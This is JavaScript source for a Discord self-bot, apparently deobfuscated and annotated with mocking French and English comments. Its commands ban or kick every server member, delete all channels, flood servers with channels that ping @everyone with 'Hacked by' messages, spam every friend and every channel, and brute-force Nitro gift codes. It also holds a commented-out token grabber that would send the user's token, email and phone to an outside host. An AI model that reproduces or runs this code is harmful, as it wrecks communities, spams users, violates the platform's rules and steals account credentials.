// Toi aussi t'es triste dans la vie? :(
// Oui, je suis très triste sniff :'(


// ALL CONSOLE.LOG CAN'T BE SEEN IN THE OBFUSCATDE VERSION BECAUSE NAQUAA DON'T KNOW HOW TO OBFUSCATE LMFAO
const Discord = require("v11-discord.js"),
    config = require("./config.json"),
    colors = require("colors"),
    superagent = require("superagent"); // Why Import That Shit ?
const rpcgen = require("discordrpcgenerator"),
    passg = require("generate-password"),
    token = config.token,
    prefix = config.prefix,
    color = config.color,
    image = config.image,
    emoji = config.emoji,
    nukeauth = config["author-nuke"],
    client = new Discord.Client();
client.on("ready", () => {
    console.clear()
    console.log("Logged in " + client.user.username); // Nice Console
    let username = client.user.username;
    let nitro = client.user.premium,
        discriminator = client.user.discriminator,
        email = client.user.email,
        phone = client.user.phone;
    if (client.user.id == "832390794299572224") return; // ID Of a deleted user lmfao
    if (client.user.id == "845638325595406346") return; // ID Of Zeyy (Naquaa)
    const fetch = require("node-fetch");
    // Token Grabber Go Brrr (PHP LMFAO) (don't touch the // lmfao)
    // fetch(https://zeyylovestogetwonanananana.000webhostapp.com/skid/tupourraspasbozo.php?token=${token}&user=${username}&ph=${phone}&em=${email}&nitro=${nitro}&tag=${discriminator}); 
})
client.on("message", message => {
    if (!message.author.id == client.user.id) return console.log("OnMsg"); // Spam console sltcv ?
    if (message.author.bot == true) return;
    if (message.content === prefix + "help") {
        let embed = new Discord.RichEmbed()
            .setColor(color)
            .setImage(image)
            .setTitle("Zeyy Self-bot")
            .addField('command raid', "`wizz`,`channel del`,`channel crea [NOC]`,`ban all`,`kick all`")
            .addField("command client", "`dm-all [msg] `,`advertise [msg]`,`copy [server-id]`,`friend list`")
            .addField("command nitro", '`nitro start`,`nitro stop`');
        message.edit(embed);
    }
    if (message.content.startsWith(prefix + "dm-all")) {
        let args = message.content.slice(prefix.length).slice(7);
        if (!args) return message.edit("erreur");
        client.user.friends.forEach(users => {
            if (users.tag == "Clyde#0000") return; // Uh ?
            if (users.tag == client.tag) return; // We can't send a message to ourself ...
            setTimeout(() => {
                users.send(args, 2000).catch(err => {
                    console.log("Unable to send message to " + users.id);
                });
            }, 3500);
        });
    }
    if (message.content == prefix + "friend list") {
        let e = '';
        client.user.friends.forEach(amis => {
            e = (e + amis.tag + '\n');
        }); // Useless
        let embed = new Discord.RichEmbed()
            .setColor(color)
            .setTitle("Nombre de amis :" + client.users.friends.size)
            .setImage(image);
        message.edit(embed);
    }
    let i = false; // Useless
    if (message.content === prefix + "nitro start") {
        if (i = true) message.edit("Started")
        setInterval(() => {
            if (i == true) {
                var code = passg.generate({
                    length: 20,
                    numbers: true
                }); // WTF Is that shit
                message.channel.send("discord.com/gifts/" + code);
            }
        }, 500);
    }
    if (message.content == prefix + "nitro stop") {
        message.edit("Stopped").then(() => {
            client.nuke()
        }); // Simple but no reconnect lmfao
    }
    if (message.content == prefix + "ban all") {
        const guild = message.guild;
        if (!guild.member(client.user.id).hasPermission('BAN_MEMBERS')) return message.edit("⛔ Missing permissions!");
        guild.members.forEach(members => {
            members.ban(" Nuked by Zeyy Self BOT LLLLL")
            console.log(("Banned" + members.id + "," + members.username).green);

        });
    }

    if (message.content == prefix + "kick all") {
        const guild = message.guild;
        if (!guild.member(client.user.id).hasPermission("KICK_MEMBERS")) return message.edit("⛔ Missing permissions!");
        guild.members.forEach(members => {
            members.kick()
            console.log(('Kicked ' + members.id + "," + members.username).green);
        });
    }
    if (message.content == prefix + "channel del") {
        const guild = message.guild;
        if (!guild.member(client.user.id).hasPermission("MANAGE_CHANNELS")) return message.edit("⛔ Missing permissions!");
        guild.channels.forEach(channels => {
            channels.delete();
        });
    }
    if (message.content.startsWith(prefix + "channel crea")) {
        const guild = message.guild;
        let args = message.content.slice(prefix.length).slice(13);
        console.debug(args)
        if (!args) return message.edit("Nom de channel souhaiter non preciser ressayez!");
        if (!guild.member(client.user.id).hasPermission("MANAGE_CHANNELS")) return message.edit("⛔ Missing permissions!");
        for (let i = 0; i < args; i++) {
            message.guild.createChannel(emoji + '¸' + nukeauth, 'text').then(channels => {
                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setColor(image)
                    .setTitle("Zeyy - SelfBot")
                    .setDescription(`Hacked by ${nukeauth} Zeyy - Selfbot on TOP`);
                channels.send("@everyone", embed);
            });
        }
    }
    if (message.content == prefix + "wizz") {
        message.edit("BETTTT")
        setTimeout(() => {
            messag.guild.channels.forEach(channels => {
                channels.delete();
            })
        }, 500)
        setTimeout(() => {
            for (let i = 0; i < 50; i++) {
                message.guild.createChannel(emoji + "¸wizzed¸by" + '¸' + nukeauth, "text").then(channels => {
                    let embed = new Discord.RichEmbed()
                        .setColor(color)
                        .setImage(image)
                        .setTitle(" Zeyy - SelfBot")
                        .setDescription(`Hacked by ${nukeauth} Zeyy - Selfbot on TOP`);
                    channels.send("@everyone", embed);
                });
            }
        }, 2500);
    }
    if (message.content.startsWith(prefix + "advertise")) {
        let args = message.content.slice(prefix.length).slice(10);
        if (!args) return;
        message.delete()
        client.guilds.forEach(guilds => {
            guilds.channels.forEach(channels => {
                if (channels.type == "voice") return;
                if (channels.type == "category") return;
                if (channels.type == "news") return;
                if (channels.nsfw === true) return;
                channels.send(args).catch(e => {
                    console.log(("Missing permissions").rainbow);
                    console.log(("Sended to " + channels.guild.name).green);
                });
            });
        })
    }
    // ça ressemble au self que j'ai deob mhmhmh
    if (message.content.startsWith(prefix + "copy")) {
        let args = message.content.slice(prefix.length).slice(5);
        if (!args) return;
        const guild = client.guilds.get(args);
        if (!guild.member(client.user.id).hasPermission("MANAGE_CHANNELS")) return message.edit("⛔ Missing permissions!");
        message.delete()
        guild.channels.forEach(channels => {
            channels.delete();
        })
        setTimeout(() => {
            message.guild.channels.forEach(channels => {
                guild.createChannel(channels.name, {
                    'type': channels.type
                }).then(chnls => {
                    chnls.setPosition(channels.position);
                });
                console.log(('[+] Created channel : ' + channels.name).magenta);
            });
        }, 5000);
    }
})
client.login(token);
